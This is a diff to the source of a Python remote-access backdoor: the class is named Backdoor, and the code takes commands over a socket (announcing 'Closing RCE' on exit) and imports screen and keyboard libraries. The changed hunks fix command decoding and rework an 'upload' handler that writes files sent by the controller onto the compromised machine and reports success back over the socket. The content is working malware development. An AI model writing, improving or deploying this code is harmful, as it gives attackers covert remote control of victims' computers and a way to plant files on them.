@@ -7,7 +7,6 @@ import requests
 import re
 import pyautogui
 import time
-from pynput.keyboard import Listener
 # from pynput.keyboard import Key, Listener
 
 if sys.platform.startswith("Windows"):
@@ -74,7 +73,7 @@ class Backdoor:
         while True:
             try:
                 message_command = self.sock.recv(2048)
-                message_command_descrypt = message_command.decode()
+                message_command_descrypt = message_command.decode("latin1")
 
                 if message_command_descrypt == "exit":
                     print("Closing RCE... Bye o/")
@@ -107,26 +106,25 @@ class Backdoor:
                         except Exception as e:
                             self.sock.send(str(e).encode())
 
-                    # Upload File
+                    # Upload File ta executando como comando no termianl.. mudar para if, sel
+
                     if message_command_descrypt.startswith("upload "):
 
-                        up_filename = message_command.split(" ")[1]
-                        
-                        print("\033[0;31m[+]\033[0;0m - Waiting File Size...")
+                        up_filename = message_command_descrypt.split(" ")[2]
+
                     
                         up_filesize = self.sock.recv(1024).decode("utf-8")
+                    
                         int_filesize = int(up_filesize)
-
-                        print("\033[0;31m[+]\033[0;0m - Receiving Data...\n")
 
                         up_data = b""
                         while len(up_data) < int_filesize:
                             up_data += self.sock.recv(int_filesize)
         
-                        with open(up_filename,"wb") as sc:
-                            sc.write(up_data)
+                        with open(up_filename,"wb") as up:
+                            up.write(up_data)
 
-                        print(f"\033[1;32m[+]\033[0;0m - Uploaded to {up_filename} finished! File Size: {str(int_filesize)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...")
+                        self.sock.send(f"\033[1;32m[+]\033[0;0m - Uploaded to {up_filename} finished! File Size: {str(int_filesize)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...".encode())
                         
                     
                         
